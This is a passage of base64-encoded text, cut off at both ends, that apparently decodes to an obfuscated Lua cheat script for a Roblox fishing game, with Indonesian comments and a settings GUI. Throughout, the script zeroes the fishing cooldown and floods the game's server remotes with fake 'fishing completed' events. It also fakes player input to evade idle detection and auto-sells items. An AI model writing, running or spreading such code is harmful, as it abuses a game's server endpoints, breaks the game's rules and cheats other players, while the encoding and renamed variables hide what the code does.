m5lY3QoKQogICAgICAgIEFsZHlUb2lNVSA9IG5pbAogICAgZW5kCiAgICBBbGR5VG9pTVUgPSAoZ2V0Z2VudigpKS5SZW1vdGVGdW5jdGlvbi5PbkNsaWVudEV2ZW50OkNvbm5lY3QoZnVuY3Rpb24oLi4uKQogICAgICAgIGlmIEFsZHlUb2liLmNhc3RTdHlsZSA9PSAibm9ybWFsIiBhbmQgQWxkeVRvaXEgPT0gMjQ1IHRoZW4KICAgICAgICAgICAgQWxkeVRvaWlVKCJmaXNoQ2F1Z2h0QW5pbUlkIiwgMSkKICAgICAgICBlbmQKICAgICAgICBBbGR5VG9pS1UgPSBmYWxzZQogICAgICAgIGlmIEFsZHlUb2lNVSB0aGVuCiAgICAgICAgICAgIEFsZHlUb2lNVTpEaXNjb25uZWN0KCkKICAgICAgICAgICAgQWxkeVRvaU1VID0gbmlsCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKbG9jYWwgdmFyX2tpNXc5cSA9IDAKCmxvY2FsIHZhcl9sOHQyamMgQWxkeVRvaXlVKCkKICAgIGlmIEFsZHlUb2lQVSB0aGVuCiAgICAgICAgQWxkeVRvaVBVOkRpc2Nvbm5lY3QoKQogICAgICAgIEFsZHlUb2lQVSA9IG5pbAogICAgZW5kCiAgICBBbGR5VG9pUFUgPSAoZ2V0Z2VudigpKS5SZW1vdGVGaXNoQ2F1Z2h0Lk9uQ2xpZW50RXZlbnQ6Q29ubmVjdChmdW5jdGlvbiguLi4pCiAgICAgICAgaWYgQWxkeVRvaWIgYW5kIChBbGR5VG9pYi5jYXN0U3R5bGUgPT0gIm5vcm1hbCIgYW5kIEFsZHlUb2lxID09IDI0NSkgdGhlbgogICAgICAgICAgICBBbGR5VG9paVUoInJieGFzc2V0aWQ6Ly82MDA4NjcwMjciLCAxKQogICAgICAgIGVuZAogICAgICAgIEFsZHlUb2lnVSA9IGZhbHNlCiAgICAgICAgQWxkeVRvaU4gPSB0aWNrKCkKICAgIGVuZCkKZW5kCgotLSBGVU5HU0kgTUVNQU5DSU5HIFVUQU1BIChESU9QVElNQUxLQU4gVU5UVUsgS0VDRVBBVEFOIE1BS1NJTUFMKQpsb2NhbCB2YXJfa2d0MThjIEFsZHlUb2llVShBbGR5VG9pUSkKICAgIGlmIEFsZHlUb2lRIHRoZW4KICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHZhcl9qOGt2OHcgPSB7MX0KICAgICAgICAgICAgKCgoKChnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKSk6V2FpdEZvckNoaWxkKCJfSW5kZXgiKSk6V2FpdEZvckNoaWxkKCJzbGVpZ2h0bmlja19uZXRAMC4yLjAiKSk6V2FpdEZvckNoaWxkKCJuZXQiKSk6V2FpdEZvckNoaWxkKCJSRV9TdGFydEZpc2hpbmdBbmltYXRpb24iKTpGaXJlU2VydmVyKHVucGFjayhBbGR5VG9pUSkpCiAgICAgICAgZW5kKQogICAgICAgIHRhc2sud2FpdCgwLjAxKSAtLSBKRURBIE1JTklNQUwgU0VURUxBSCBTVEFSVCBBTklNQVRJT04KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgQWxkeVRvaWIuYXV0b0Zpc2hpbmcgZG8KICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAtLSBCWVBBU1MgQ09PTERPV04gTUVNQU5DSU5HCiAgICAgICAgICAgICAgICAgICAgQWxkeVRvaXhVLk9uQ29vbGRvd24gPSBmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9zdjk0amUsIEFsZHlUb2lUID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVxdWlyZSgoQWxkeVRvaUg6V2FpdEZvckNoaWxkKCJTaGFyZWQiKSk6V2FpdEZvckNoaWxkKCJGaXNoaW5nQ29uZmlnIikpCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIGlmIEFsZHlUb2lRIGFuZCB0eXBlKEFsZHlUb2lUKSA9PSAidGFibGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3RnMHc2eCA9IEFsZHlUb2lULkZpc2hpbmdDb29sZG93blRpbWUKICAgICAgICAgICAgICAgICAgICAgICAgQWxkeVRvaVQuRmlzaGluZ0Nvb2xkb3duVGltZSA9IDAgLS0gTUVOR0FUVVIgQ09PTERPV04gTUVOSkFESSAwCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgQWxkeVRvaUtVID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIEFsZHlUb2lOID0gdGljaygpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gU0tJUCBBTklNQVRJT04gREVOR0FOIE1FTUFOR0dJTCBMQU5HU1VORyBSRl9DaGFyZ2VGaXNoaW5nUm9kCiAgICAgICAgICAgICAgICAgICAgQWxkeVRvaUkuUkZfQ2hhcmdlRmlzaGluZ1JvZDpJbnZva2VTZXJ2ZXIoQWxkeVRvaVk6R2V0U2VydmVyVGltZU5vdygpKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9hZWx4bXgsIEFsZHlUb2lHCiAgICAgICAgICAgICAgICAgICAgaWYgQWxkeVRvaWIuY2FzdFN0eWxlID09ICJwZXJmZWN0IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIEFsZHlUb2ljLCBBbGR5VG9pRyA9IC0wLjc0OTk5OTY0MjM3MjEzLCAxCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIEFsZHlUb2liLmNhc3RTdHlsZSA9PSAiQW1hemluZyIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBBbGR5VG9pYywgQWxkeVRvaUcgPSAtMTM5LjYzNzk2OTk3MDcsIDAuODc2OTQyMjYzOTQ5MjgKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIEFsZHlUb2ljID0gbWF0aC5yYW5kb20oLTEwMDAsIDEwMDApIC8gMTAwMAogICAgICAgICAgICAgICAgICAgICAgICBBbGR5VG9pRyA9IG1hdGgucmFuZG9tKDAsIDEwMDApIC8gMTAwMAogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAtLSBTS0lQIEFOSU1BVElPTiBERU5HQU4gTUVOR0hJTEFOR0tBTiBQRU1BTkdHSUxBTiBBTklNQVNJIChLQVJFTkEgTU9ERSA9ICJza2lwIikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBBbGR5VG9pSS5SRl9SZXF1ZXN0RmlzaGluZ01pbmlnYW1lU3RhcnRlZDpJbnZva2VTZXJ2ZXIoQWxkeVRvaWMsIEFsZHlUb2lHKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIEFsZHlUb2ltVSgpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX2ZkOXFwNCA9IEFsZHlUb2liLmVuYWJsZUZpbHRlcgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl90aGdrNXcgPSB7fQogICAgICAgICAgICAgICAgICAgIHdoaWxlIEFsZHlUb2lLVSBkbwogICAgICAgICAgICAgICAgICAgICAgICAtLSBTUEFNIFJFX0Zpc2hpbmdDb21wbGV0ZWQgdW50dWsgbWVueWVsZXNhaWthbiBtaW5pZ2FtZSBTRUNFUEFUIE1VTkdLSU4KICAgICAgICAgICAgICAgICAgICAgICAgQWxkeVRvaUkuUkVfRmlzaGluZ0NvbXBsZXRlZDpGaXJlU2VydmVyKHVucGFjayhBbGR5VG9pUSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKSAtLSBKRURBIFNBTkdBVCBNSU5JTUFMIEFOVEFSIFNQQU0gQ09NUExFVElPTgogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgdGFzay53YWl0KEFsZHlUb2liLmxvb3BEZWxheSkgLS0gSkVEQSBBTlRBUiBTSUtMVVMgUEFOQ0lOR0FOIChBVFVSIERJIEdVSSBLRSAwLjAxKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgQWxkeVRvaUkuUkZfQ2FuY2VsRmlzaGluZzpJbnZva2VTZXJ2ZXIoKQogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgQWxkeVRvaXhVIGFuZCBBbGR5VG9peFUuUmVxdWVzdENsaWVudFN0b3BGaXNoaW5nIHRoZW4KICAgICAgICAgICAgICAgIEFsZHlUb2l4VTpSZXF1ZXN0Q2xpZW50U3RvcEZpc2hpbmcodHJ1ZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZAoKLS0gSEFQVVMgRlVOR1NJIE1FTUFOQ0lORyBMQU1CQVQgKEFsZHlUb2lvVSwgQWxkeVRvaWNHKQotLSBGVU5HU0kgVU5UVUsgQVJUSUZBQ1QgVEVUQVAgRElKQUdBLCBURVRBUEkgRElPUFRJTUFMS0FOIEtFQ0VQQVRBTk5ZQToKCmxvY2FsIHZhcl96enBlcWogQWxkeVRvaVFHKCkKICAgIGlmIEFsZHlUb2lFVSB0aGVuCiAgICAgICAgQWxkeVRvaUVVOkRpc2Nvbm5lY3QoKQogICAgICAgIEFsZHlUb2lFVSA9IG5pbAogICAgZW5kCiAgICBBbGR5VG9pRVUgPSAoZ2V0Z2VudigpKS5SZW1vdGVGdW5jdGlvbi5PbkNsaWVudEV2ZW50OkNvbm5lY3QoZnVuY3Rpb24oLi4uKQogICAgICAgIEFsZHlUb2lIVSA9IGZhbHNlCiAgICAgICAgQWxkeVRvaU4gPSB0aWNrKCkKICAgICAgICBpZiBBbGR5VG9pRVUgdGhlbgogICAgICAgICAgICBBbGR5VG9pRVU6RGlzY29ubmVjdCgpCiAgICAgICAgICAgIEFsZHlUb2lFVSA9IG5pbAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmxvY2FsIHZhcl94bXF2czIgQWxkeVRvaVRHKCkKICAgIGlmIEFsZHlUb2lBVSB0aGVuCiAgICAgICAgQWxkeVRvaUFVOkRpc2Nvbm5lY3QoKQogICAgICAgIEFsZHlUb2lBVSA9IG5pbAogICAgZW5kCiAgICBBbGR5VG9pQVUgPSAoZ2V0Z2VudigpKS5SZW1vdGVGaXNoQ2F1Z2h0Lk9uQ2xpZW50RXZlbnQ6Q29ubmVjdChmdW5jdGlvbiguLi4pCiAgICAgICAgQWxkeVRvaXBVID0gZmFsc2UKICAgICAgICBBbGR5VG9pTiA9IHRpY2soKQogICAgICAgIGlmIEFsZHlUb2lBVSB0aGVuCiAgICAgICAgICAgIEFsZHlUb2lBVTpEaXNjb25uZWN0KCkKICAgICAgICAgICAgQWxkeVRvaUFVID0gbmlsCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKbG9jYWwgdmFyXzVncGU5MyBBbGR5VG9pWUcoQWxkeVRvaVEpCiAgICBpZiBBbGR5VG9pUSB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCB2YXJfendrbmNuID0gezF9CiAgICAgICAgICAgICgoKCgoZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpKTpXYWl0Rm9yQ2hpbGQoIlBhY2thZ2VzIikpOldhaXRGb3JDaGlsZCgiX0luZGV4IikpOldhaXRGb3JDaGlsZCgic2xlaWdodG5pY2tfbmV0QDAuMi4wIikpOldhaXRGb3JDaGlsZCgibmV0IikpOldhaXRGb3JDaGlsZCgiUkVfU3RhcnRGaXNoaW5nQW5pbWF0aW9uIik6RmlyZVNlcnZlcih1bnBhY2soQWxkeVRvaVEpKQogICAgICAgIGVuZCkKICAgICAgICB0YXNrLndhaXQoMC4wMSkgLS0gSkVEQSBNSU5JTUFMCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIEFsZHlUb2liLmF1dG9BcnRpZmFjdCBkbwogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIEFsZHlUb2l4VS5PbkNvb2xkb3duID0gZnVuY3Rpb24oLi4uKQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBBbGR5VG9pcFUgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgQWxkeVRvaU4gPSB0aWNrKCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBBbGR5VG9pSS5SRl9DaGFyZ2VGaXNoaW5nUm9kOkludm9rZVNlcnZlcihBbGR5VG9pWTpHZXRTZXJ2ZXJUaW1lTm93KCkpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX3dlbTg0dCwgQWxkeVRvaVQKICAgICAgICAgICAgICAgICAgICBpZiBBbGR5VG9pYi5jYXN0U3R5bGUgPT0gInBlcmZlY3QiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgQWxkeVRvaVEsIEFsZHlUb2lUID0gLTAuNzQ5OTk5NjQyMzcyMTMsIDEKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgQWxkeVRvaWIuY2FzdFN0eWxlID09ICJBbWF6aW5nIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIEFsZHlUb2lRLCBBbGR5VG9pVCA9IC0xMzkuNjM3OTY5OTcwNywgMC44NzY5NDIyNjM5NDkyOAogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgQWxkeVRvaVEgPSBtYXRoLnJhbmRvbSgtMTAwMCwgMTAwMCkgLyAxMDAwCiAgICAgICAgICAgICAgICAgICAgICAgIEFsZHlUb2lUID0gbWF0aC5yYW5kb20oMCwgMTAwMCkgLyAxMDAwCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgQWxkeVRvaUkuUkZfUmVxdWVzdEZpc2hpbmdNaW5pZ2FtZVN0YXJ0ZWQ6SW52b2tlU2VydmVyKEFsZHlUb2lRLCBBbGR5VG9pVCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfajZzcXEzID0ge30KICAgICAgICAgICAgICAgICAgICB3aGlsZSBBbGR5VG9pcFUgZG8KICAgICAgICAgICAgICAgICAgICAgICAgLS0gU1BBTSBSRV9GaXNoaW5nQ29tcGxldGVkCiAgICAgICAgICAgICAgICAgICAgICAgIEFsZHlUb2lJLlJFX0Zpc2hpbmdDb21wbGV0ZWQ6RmlyZVNlcnZlcih1bnBhY2soQWxkeVRvaWMpKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdChBbGR5VG9pYi5sb29wRGVsYXkpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVsc2UKICAgICAgICBBbGR5VG9pSS5SRl9DYW5jZWxGaXNoaW5nOkludm9rZVNlcnZlcigpCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBBbGR5VG9peFUgYW5kIEFsZHlUb2l4VS5SZXF1ZXN0Q2xpZW50U3RvcEZpc2hpbmcgdGhlbgogICAgICAgICAgICAgICAgQWxkeVRvaXhVOlJlcXVlc3RDbGllbnRTdG9wRmlzaGluZyh0cnVlKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCgpsb2NhbCB2YXJfaTZvd3V3ID0ge2VuYWJsZWQgPSBmYWxzZSwgcG9zaXRpb24gPSBuaWx9CmxvY2FsIHZhcl85eGN0bHEgPSB0cnVlCmxvY2FsIHZhcl9tbGd1cWQgPSB7fQpsb2NhbCB2YXJfejVlM2VrID0gImxhc3RfcG9zaXRpb24uanNvbiIKCmxvY2FsIHZhcl84NmV0a28gQWxkeVRvaWdHKCkKICAgIGxvY2FsIHZhcl9rc2Fuc28gPSBBbGR5VG9pRy5DaGFyYWN0ZXIKICAgIGlmIEFsZHlUb2lRIGFuZCBBbGR5VG9pUTpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICBsb2NhbCB2YXJfeTEya3ByID0gQWxkeVRvaVEuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICBBbGR5VG9pc0cgPSB7QWxkeVRvaVQuWCwgQWxkeVRvaVQuWSwgQWxkeVRvaVQuWiwgKHtBbGR5VG9pVDpUb09yaWVudGF0aW9uKCl9KVsxXSwgKHtBbGR5VG9pVDpUb09yaWVudGF0aW9uKCl9KVsyXSwgKHtBbGR5VG9pVDpUb09yaWVudGF0aW9uKCl9KVszXX0KICAgICAgICB3cml0ZWZpbGUoQWxkeVRvaUhHLCBBbGR5VG9pTzpKU09ORW5jb2RlKEFsZHlUb2lzRykpCiAgICBlbmQKZW5kCgpsb2NhbCB2YXJfZHdwcm8zIEFsZHlUb2lwRygpCiAgICBpZiBpc2ZpbGUoQWxkeVRvaUhHKSB0aGVuCiAgICAgICAgbG9jYWwgdmFyX3ZwNHExeiA9IEFsZHlUb2lPOkpTT05EZWNvZGUocmVhZGZpbGUoQWxkeVRvaUhHKSkKICAgICAgICBBbGR5VG9pc0cgPSBBbGR5VG9pUQogICAgZW5kCiAgICBsb2NhbCB2YXJfMG53bHhxID0gQWxkeVRvaXNHCiAgICBpZiBBbGR5VG9pUSBhbmQgKHR5cGVvZihBbGR5VG9pUSkgPT0gInRhYmxlIiBhbmQgI0FsZHlUb2lRID49IDMpIHRoZW4KICAgICAgICBsb2NhbCB2YXJfdHoyNHpnID0gQWxkeVRvaUcuQ2hhcmFjdGVyIG9yIEFsZHlUb2lHLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIHZhcl9iZ3JwcHMgPSBBbGR5VG9pVDpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiLCA1KQogICAgICAgIGlmIEFsZHlUb2ljIHRoZW4KICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgQWxkeVRvaWMuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhBbGR5VG9pUVsxXSwgQWxkeVRvaVFbMl0sIEFsZHlUb2lRWzNdKSAqIENGcmFtZS5mcm9tT3JpZW50YXRpb24oQWxkeVRvaVFbNF0gb3IgMCwgQWxkeVRvaVFbNV0gb3IgMCwgQWxkeVRvaVFbNl0gb3IgMCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIHZhcl8zcXhwamEgPSBuaWwKCmxvY2FsIHZhcl9qcGVra2kgQWxkeVRvaVZHKEFsZHlUb2lRKQogICAgaWYgQWxkeVRvaVEgdGhlbgogICAgICAgIGxvY2FsIHZhcl95MXI1a20gPSBBbGR5VG9pWTpXYWl0Rm9yQ2hpbGQoIkNoYXJhY3RlcnMiLCA1KQogICAgICAgIGxvY2FsIHZhcl91NW9wcXcgPSBBbGR5VG9pUTpGaW5kRmlyc3RDaGlsZChBbGR5VG9pRy5OYW1lKQogICAgICAgIGlmIG5vdCBBbGR5VG9pVCB0aGVuIHJldHVybiBlbmQKICAgICAgICBsb2NhbCB2YXJfYnhseGQxID0gQWxkeVRvaVQ6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGlmIG5vdCBBbGR5VG9pYyB0aGVuIHJldHVybiBlbmQKICAgICAgICBBbGR5VG9pZEcgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQogICAgICAgIEFsZHlUb2lkRy5BbmNob3JlZCA9IHRydWUKICAgICAgICBBbGR5VG9pZEcuU2l6ZSA9IFZlY3RvcjMubmV3KDEwLCAxLCAxMCkKICAgICAgICBBbGR5VG9pZEcuVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIEFsZHlUb2lkRy5DYW5Db2xsaWRlID0gdHJ1ZQogICAgICAgIEFsZHlUb2lkRy5OYW1lID0gImZsb2F0cGxhdGZvcm0iCiAgICAgICAgQWxkeVRvaWRHLlBhcmVudCA9IEFsZHlUb2lZCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIEFsZHlUb2lkRyBhbmQgQWxkeVRvaWRHLlBhcmVudCBkbwogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIEFsZHlUb2lkRy5Qb3NpdGlvbiA9IEFsZHlUb2ljLlBvc2l0aW9uIC0gVmVjdG9yMy5uZXcoMCwgMy41LCAwKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIGlmIEFsZHlUb2lkRyB0aGVuCiAgICAgICAgICAgIEFsZHlUb2lkRzpEZXN0cm95KCkKICAgICAgICAgICAgQWxkeVRvaWRHID0gbmlsCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCB2YXJfYjdneTJ4IEFsZHlUb2l4RygpCiAgICBsb2NhbCB2YXJfNmZsaXQwID0gQWxkeVRvaUcuQ2hhcmFjdGVyCiAgICBpZiBBbGR5VG9pUSBhbmQgQWxkeVRvaVE6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgIEFsZHlUb2lRLkh1bWFub2lkLkhlYWx0aCA9IDAKICAgIGVuZAogICAgQWxkeVRvaVZHKEFsZHlUb2liLmZsb2F0aW5nUGxhdGZvcm0pCiAgICBsb2NhbCB2YXJfZ21uOGI5ID0gQWxkeVRvaVkuQ2hhcmFjdGVyczpGaW5kRmlyc3RDaGlsZChBbGR5VG9pRy5OYW1lKQogICAgbG9jYWwgdmFyX3Exa2JvbiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKZW5kCgpsb2NhbCB2YXJfZWo0emV2IEFsZHlUb2l6RygpCiAgICBsb2NhbCB2YXJfYzI4NDNjID0gZ2FtZTpHZXRTZXJ2aWNlKCJWaXJ0dWFsVXNlciIpCiAgICBBbGR5VG9pVC5Mb2NhbFBsYXllci5JZGxlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBBbGR5VG9pUTpCdXR0b24yRG93bihWZWN0b3IyLm5ldygwLCAwKSwgQWxkeVRvaVkuQ3VycmVudENhbWVyYS5DRnJhbWUpCiAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgQWxkeVRvaVE6QnV0dG9uMlVwKFZlY3RvcjIubmV3KDAsIDApLCBBbGR5VG9pWS5DdXJyZW50Q2FtZXJhLkNGcmFtZSkKICAgICAgICBBbGR5VG9pUTpDYXB0dXJlQ29udHJvbGxlcigpCiAgICAgICAgQWxkeVRvaVE6Q2xpY2tCdXR0b24yKFZlY3RvcjIubmV3KCkpCiAgICBlbmQpCmVuZAoKQWxkeVRvaXpHKCkKCmxvY2FsIHZhcl82dHYyM2ogQWxkeVRvaWZHKCkKICAgIEFsZHlUb2lJLlJGX1NlbGxBbGxJdGVtczpJbnZva2VTZXJ2ZXIoKQogICAgQWxkeVRvaWRVID0gMAplbmQKCmxvY2FsIHZhcl9pNXI4cjMsIEFsZHlUb2l3RywgQWxkeVRvaWxHLCBBbGR5VG9pdUcsIEFsZHlUb2lxRywgQWxkeVRvaXRHLCBBbGR5VG9pUkcsIEFsZHlUb2luRwpsb2NhbCB2YXJfdXUzOThtID0gMTAKCmRvCiAgICBBbGR5VG9pajpQYXJhZ3JhcGgoewogICAgICAgIFRpdGxlID0gIkF1dG8gRmlzaGluZyBTZXR0aW5ncyIsCiAgICAgICAgRGVzYyA9ICJDaGFuZ2UgeW91ciBzZXR0aW5ncyBoZXJlLiIsCiAgICAgICAgQ29sb3IgPSAiR3JlZW4iLAogICAgICAgIExvY2tlZCA9IHRydWUKICAgIH0pCiAgICBBbGR5VG9pbkcgPSBBbGR5VG9pajpEcm9wZG93bih7CiAgICAgICAgVGl0bGUgPSAiU2VsZWN0IENhc3QiLAogICAgICAgIFZhbHVlcyA9IHsiUmFuZG9tIiwgInBlcmZlY3QiLCAiQW1hemluZyJ9LAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBEZWZhdWx0ID0gIlJhbmRvbSIsCiAgICAgICAgQWxsb3dOb25lID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihBbGR5VG9pUSkKICAgICAgICAgICAgQWxkeVRvaWIuY2FzdFN0eWxlID0gQWxkeVRvaVEKICAgICAgICBlbmQKICAgIH0pCiAgICBBbGR5VG9pSkcgPSBBbGR5VG9pajpUb2dnbGUoewogICAgICAgIFRpdGxlID0gIkF1dG8gRmlzaGluZyIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oQWxkeVRvaVEpCiAgICAgICAgICAgIEFsZHlUb2liLmF1dG9GaXNoaW5nID0gQWxkeVRvaVEKICAgICAgICAgICAgQWxkeVRvaWVVKEFsZHlUb2lRKQogICAgICAgICAgICAtLSBIQVBVUyBMT0dJQyBNT0RFIFNMT1cvTk9STUFML1NUVUNLCiAgICAgICAgICAgIGlmIG5vdCBBbGR5VG9pUSB0aGVuCiAgICAgICAgICAgICAgICAtLSBBTERZVE9JRVUgU1VEQUggRElPUFRJTUFMS0FOIFVOVFVLIFNUT1AgREFOIEtFQ0VQQVRBTgogICAgICAgICAgICAgICAgQWxkeVRvaWVVKEFsZHlUb2lRKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCiAgICAtLSBQRU5USU5HOiBTTElERVIgSU5JIEhBUlVTIERJQVRVUiBLRSBOSUxBSSBURVJFTkRBSCBESSBHVUkgVU5UVUsgS0VDRVBBVEFOIE1BS1NJTUFMCiAgICBBbGR5VG9pdUcgPSBBbGR5VG9pajpTbGlkZXIoewogICAgICAgIFRpdGxlID0gIkxvb3AgRGVsYXkiLAogICAgICAgIFZhbHVlID0gewogICAgICAgICAgICBNaW4gPSAwLjA5LAogICAgICAgICAgICBNYXggPSAyLAogICAgICAgICAgICBEZWZhdWx0ID0gMC4wMSAKICAgICAgICB9LAogICAgICAgIFN0ZXAgPSAwLjEsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihBbGR5VG9pUSkKICAgICAgICAgICAgQWxkeVRvaWIubG9vcERlbGF5ID0gQWxkeVRvaVEKICAgICAgICBlbmQKICAgIH0pCiAgICBBbGR5VG9pUkcgPSBBbGR5VG9pajpEcm9wZG93bih7CiAgICAgICAgVGl0bGUgPSAiRmlzaGluZyBBbmltYXRpb24iLAogICAgICAgIFZhbHVlcyA9IHsic2tpcCIsICJub3JtYWwifSwKICAgICAgICBEZWZhdWx0ID0gInNraXAiLCAtLSBESUFUVVIgS0UgU0tJUCBTRUNBUkEgREVGQVVMVCBVTlRVSyBLRUNFUEFUQU4KICAgICAgICBNdWx0aSA9IGZhbHNlLAogICAgICAgIEFsbG93Tm9uZSA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oQWxkeVRvaVEpCiAgICAgICAgICAgIEFsZHlUb2liLmFuaW1hdGUgPSBBbGR5VG9pUQogICAgICAgIGVuZAogICAgfSkKICAgIEFsZHlUb2l0RyA9IEFsZHlUb2lqOlRvZ2dsZSh7CiAgICAgICAgVGl0bGUgPSAiQXV0byBSZWNhc3QvQW50aSBTdHVjayIsCiAgICAgICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IHJlY2FzdHMgaWYgeW91IGdldCBzdHVjay4iLAogICAgICAgIERlZmF1bHQgPSB0cnVlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oQWxkeVRvaVEpCiAgICAgICAgICAgIEFsZHlUb2liLmF1dG9SZWNhc3QgPSBBbGR5VG9pUQogICAgICAgIGVuZAogICAgfSkKICAgIEFsZHlUb2lxRyA9IEFsZHlUb2lqOlNsaWRlcih7CiAgICAgICAgVGl0bGUgPSAiQXV0byBSZWNhc3QgRGVsYXkiLAogICAgICAgIERlZmF1bHQgPSB7CiAgICAgICAgICAgIE1pbiA9IDYsCiAgICAgICAgICAgIE1heCA9IDIwLAogICAgICAgICAgICBEZWZhdWx0ID0gMTAKICAgICAgICB9LAogICAgICAgIFN0ZXAgPSAxLAogICAgICAgIFZhbHVlID0gMTAsCiAgICAgICAgQ2Fsb